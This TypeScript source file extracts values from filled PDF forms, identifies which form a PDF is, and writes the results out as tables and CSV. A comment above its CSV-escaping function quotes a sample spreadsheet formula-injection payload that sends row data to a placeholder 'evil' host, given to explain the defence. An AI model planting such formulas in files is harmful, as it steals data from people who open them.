// The inverse of resolve.ts: a filled form's raw AcroForm fields → friendly values.
//
// A form pack is a bidirectional map. resolveFormFill walks it forward (friendly key →
// raw field + on-state); this walks it backward (raw field → friendly key), so the same
// pack that fills a form also reads one back. That symmetry is the whole point: a form we
// can fill is a form we can extract, with no extra mapping to author.
//
// Round-trip note: extraction recovers the VALUE, not the input spelling. A `split` SSN
// comes back as the digits the boxes hold ("123456789", not "123-45-6789") and a `date`
// normalizes to ISO regardless of the mask it was written with. fill(extract(x)) is stable.

import type { FormField, FormSchema } from "./types.js";

/** One filled form's raw fields, as read from the PDF. */
export interface RawField {
  name: string;
  value?: string;
  type?: string;
}

export interface ExtractedForm {
  form: string; // schema id
  title: string;
  values: Record<string, string>; // friendly key → value (only fields that had one)
  empty: string[]; // mapped keys the form left blank
  warnings: string[];
}

const OFF = new Set(["", "off", "0", "no"]);

/** Is this widget's value an "on" state? */
function isOn(value: string | undefined, on?: string): boolean {
  const v = (value ?? "").trim();
  if (!v || OFF.has(v.toLowerCase())) return false;
  return on ? v === on : true;
}

/** Re-assemble ISO YYYY-MM-DD from a mask like MMDDYYYY / MM-DD-YYYY / MM/DD/YYYY. */
function parseMasked(value: string, fmt: string): string | null {
  const order: Array<"y" | "m" | "d"> = [];
  const widths: number[] = [];
  for (const tok of fmt.match(/YYYY|YY|MM|DD/g) ?? []) {
    order.push(tok[0] === "Y" ? "y" : tok[0] === "M" ? "m" : "d");
    widths.push(tok.length);
  }
  const digits = value.replace(/\D/g, "");
  if (order.length !== 3 || digits.length !== widths.reduce((a, b) => a + b, 0)) return null;
  const got: Record<string, string> = {};
  let pos = 0;
  for (let i = 0; i < order.length; i++) {
    got[order[i]!] = digits.slice(pos, pos + widths[i]!);
    pos += widths[i]!;
  }
  const y = got["y"]!.length === 2 ? (Number(got["y"]) > 30 ? `19${got["y"]}` : `20${got["y"]}`) : got["y"]!;
  return `${y}-${got["m"]}-${got["d"]}`;
}

/** Read one field's value back out of the raw widget map. */
function readField(field: FormField, byName: Map<string, RawField[]>): string | null {
  const first = (n: string): string => (byName.get(n) ?? []).map((w) => w.value ?? "").find((v) => v !== "") ?? "";

  if (field.type === "choice") {
    // Whichever option's widget carries its on-state is the answer.
    for (const [label, opt] of Object.entries(field.options ?? {})) {
      const target = opt.field ?? field.field;
      if (!target) continue;
      for (const w of byName.get(target) ?? []) if (isOn(w.value, opt.on)) return label;
    }
    return null;
  }
  if (field.type === "checkbox") {
    if (!field.field) return null;
    const on = (byName.get(field.field) ?? []).some((w) => isOn(w.value, field.on));
    return on ? "true" : null; // an unticked box is "no answer", not "false"
  }
  if (field.type === "date") {
    if (field.parts?.length) {
      const got: Record<string, string> = {};
      for (const p of field.parts) if (p.part) got[p.part] = first(p.field);
      const { year, month, day } = got as Record<string, string | undefined>;
      if (!year || !month || !day) return null;
      const y = year.length === 2 ? (Number(year) > 30 ? `19${year}` : `20${year}`) : year;
      return `${y}-${month.padStart(2, "0")}-${day.padStart(2, "0")}`;
    }
    if (!field.field) return null;
    const raw = first(field.field);
    if (!raw) return null;
    return parseMasked(raw, field.format || "MM/DD/YYYY") ?? raw;
  }
  if (field.type === "split") {
    const joined = (field.parts ?? []).map((p) => first(p.field)).join("");
    return joined || null;
  }
  // text / dropdown
  if (!field.field) return null;
  return first(field.field) || null;
}

/** Read a filled form back through its pack: raw fields → friendly key/value. */
export function extractFormValues(schema: FormSchema, raw: RawField[]): ExtractedForm {
  const byName = new Map<string, RawField[]>();
  for (const f of raw) {
    if (!byName.has(f.name)) byName.set(f.name, []);
    byName.get(f.name)!.push(f);
  }

  const values: Record<string, string> = {};
  const empty: string[] = [];
  const warnings: string[] = [];

  for (const field of schema.fields) {
    if (field.type === "repeat") {
      // Each row is one record; a row with no values at all is simply absent.
      for (const sub of field.fields_repeat ?? []) {
        sub.fields.forEach((target, i) => {
          const v = (byName.get(target) ?? []).map((w) => w.value ?? "").find((x) => x !== "");
          if (v) values[`${field.key}[${i}].${sub.key}`] = v;
        });
      }
      continue;
    }
    const v = readField(field, byName);
    if (v == null || v === "") empty.push(field.key);
    else values[field.key] = v;
  }

  if (!raw.length) warnings.push("no form fields found — the PDF has no AcroForm (was it flattened?)");
  else if (!Object.keys(values).length) warnings.push("every mapped field was blank — is this a filled copy of the form?");

  return { form: schema.id, title: schema.title, values, empty, warnings };
}

export interface FormMatch {
  form: string;
  score: number; // 0..1 — share of the pack's snapshot present in this PDF
}

/** Identify which pack a PDF belongs to by its field-name signature.
 *
 *  Every pack carries the blank form's authoritative field list, so a filled PDF can be
 *  matched against all of them without shipping the blanks. Scoring by the SHARE of the
 *  pack's snapshot found (not the raw overlap count) keeps a big pack from outranking a
 *  small one it happens to share names with. */
export function detectForm(fieldNames: string[], schemas: FormSchema[]): FormMatch[] {
  const have = new Set(fieldNames);
  const out: FormMatch[] = [];
  for (const s of schemas) {
    const snap = s.source?.fields ?? [];
    if (!snap.length) continue;
    const hit = snap.filter((f) => have.has(f.name)).length;
    const score = hit / snap.length;
    if (score > 0) out.push({ form: s.id, score: Math.round(score * 1000) / 1000 });
  }
  return out.sort((a, b) => b.score - a.score);
}

/** One form type's extractions as a table: header + one row per file.
 *
 *  Each form type gets its OWN table because their schemas are unrelated — unioning a
 *  W-9 and a 1040 into one grid yields a sparse mess whose columns depend on which files
 *  happened to be present.
 *
 *  Columns come from the PACK's field order, not from the data, so the header is stable
 *  across runs: it doesn't shift when a form leaves a field blank or when new files are
 *  added later. A downstream table can be created once and appended to forever. Keys the
 *  pack can't declare up front (repeat rows like `dependents[0].name`) are appended in
 *  first-seen order. */
export function toTable(rows: Array<{ file: string; extracted: ExtractedForm }>, schema?: FormSchema): string[][] {
  const cols: string[] = [];
  for (const f of schema?.fields ?? []) if (f.type !== "repeat") cols.push(f.key);
  for (const r of rows) for (const k of Object.keys(r.extracted.values)) if (!cols.includes(k)) cols.push(k);
  const header = ["_file", "_form", ...cols];
  const body = rows.map((r) => [r.file, r.extracted.form, ...cols.map((c) => r.extracted.values[c] ?? "")]);
  return [header, ...body];
}

/** Group extractions by form id, preserving order — one CSV per form type. */
export function groupByForm<T extends { extracted: ExtractedForm }>(rows: T[]): Map<string, T[]> {
  const by = new Map<string, T[]>();
  for (const r of rows) {
    const id = r.extracted.form;
    if (!by.has(id)) by.set(id, []);
    by.get(id)!.push(r);
  }
  return by;
}

/** Plain number — safe to leave as-is, so amounts stay numeric downstream. */
const CSV_NUMERIC = /^[+-]?(\d+\.?\d*|\.\d+)([eE][+-]?\d+)?$/;

/**
 * Neutralize a cell a spreadsheet would evaluate as a FORMULA (CWE-1236). Every cell
 * here is document-derived (a form field the PDF's author controls), so RFC-4180
 * quoting alone is not enough: a value of `=IMPORTXML("http://evil/?d="&A1,"/x")` — or
 * a `+`/`-`/`@` DDE payload — exfiltrates the row the moment someone opens the CSV in
 * Excel / Sheets / LibreOffice. An apostrophe prefix makes it show as literal text.
 * Mirrors `_csv_safe` in extension/resources/python/pdf_exec.py — keep the two in step.
 */
function csvSafe(v: string): string {
  const head = v.replace(/^[\t\r\n ]+/, ""); // spreadsheets trim leading whitespace first
  return head.length > 1 && "=+-@".includes(head[0]!) && !CSV_NUMERIC.test(head) ? `'${v}` : v;
}

/** RFC 4180 CSV, with formula-injection-safe cells. */
export function toCsv(rows: string[][]): string {
  const cell = (v: string) => {
    const s = csvSafe(v);
    return /[",\r\n]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
  };
  return rows.map((r) => r.map(cell).join(",")).join("\r\n") + "\r\n";
}
